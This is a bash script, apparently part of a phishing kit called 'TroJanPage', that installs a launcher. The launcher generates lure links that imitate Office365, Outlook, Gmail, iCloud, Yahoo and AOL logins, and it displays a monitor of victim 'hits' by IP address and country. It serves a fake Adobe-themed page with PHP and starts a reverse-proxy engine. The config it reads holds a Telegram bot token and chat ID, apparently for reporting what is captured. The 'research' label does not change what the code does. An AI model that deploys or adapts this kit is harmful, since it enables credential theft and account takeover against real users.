#!/bin/bash
# 🏛️ TROJANPAGE - FINAL RESEARCH DEPLOYMENT (V14.9.7)
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

# --- 1. CONFIG LOADING (CONTINUITY CHECK) ---
CONFIG="/root/config.json"
if [ ! -f "$CONFIG" ]; then
    echo -e "${RED}[!] Configuration missing. Please run the setup again.${NC}"
    exit 1
fi

DOMAIN=$(jq -r '.proxyDomain' $CONFIG)
TG_TOKEN=$(jq -r '.telegramToken' $CONFIG)
TG_ID=$(jq -r '.telegramChatId' $CONFIG)

# --- 2. THE GHOST TERMINAL (6 TARGETS + LIVE MONITOR) ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

# (ASCII Header remains unchanged)
clear
echo -e "${BLUE}  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    
DOMAIN=$(jq -r '.proxyDomain' /root/config.json)
SLUG=$(jq -r '.slug' /root/config.json 2>/dev/null || echo "verify")
MASK=$(tr -dc '0-9' < /dev/urandom | head -c 10)
TOKEN=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 8)

echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║${NC}  ${CYAN}COMPLETE GHOST TERMINAL${NC} | ${PURPLE}TARGETS:${NC} 06 | ${GREEN}STATUS: ONLINE${NC}      ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC} 01 | Office365 | https://$DOMAIN/s/?id=office&m=$MASK&s=$SLUG&t=$TOKEN  ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 02 | Outlook   | https://$DOMAIN/s/?id=outlook&m=$MASK&s=$SLUG&t=$TOKEN ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 03 | Gmail     | https://$DOMAIN/s/?id=gmail&m=$MASK&s=$SLUG&t=$TOKEN   ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 04 | iCloud    | https://$DOMAIN/s/?id=icloud&m=$MASK&s=$SLUG&t=$TOKEN  ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 05 | Yahoo     | https://$DOMAIN/s/?id=yahoo&m=$MASK&s=$SLUG&t=$TOKEN   ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 06 | AOL       | https://$DOMAIN/s/?id=aol&m=$MASK&s=$SLUG&t=$TOKEN     ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC}               ${YELLOW}LIVE ACTIVITY MONITOR (RECENT HITS)${NC}                ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC}  ${CYAN}TIME${NC}       |  ${CYAN}TARGET${NC}   |  ${CYAN}IP ADDRESS${NC}      |  ${CYAN}COUNTRY${NC}        ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"

# Result Formatting
if [ -s /root/hits.json ]; then
    tail -n 5 /root/hits.json | jq -r '"║ \(.timestamp) | \(.target | ascii_upcase | .[0:8]) | \(.ip | .[0:15]) | \(.country | .[0:12]) ║"'
else
    echo -e "${BLUE}║${NC}        No activity detected yet. Waiting for lures...         ${BLUE}║${NC}"
fi
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════╝${NC}"

# Core Engine Execution
sudo fuser -k 80/tcp 443/tcp 2>/dev/null
pkill -9 proxy
screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
cd /root/engine/dist/ && ./proxy -config /root/config.json
EOF

chmod +x /root/run.sh
sudo ln -sf /root/run.sh /usr/local/bin/Run
echo -e "${GREEN}[success] Visual Research Terminal Deployed. Type 'Run'.${NC}"
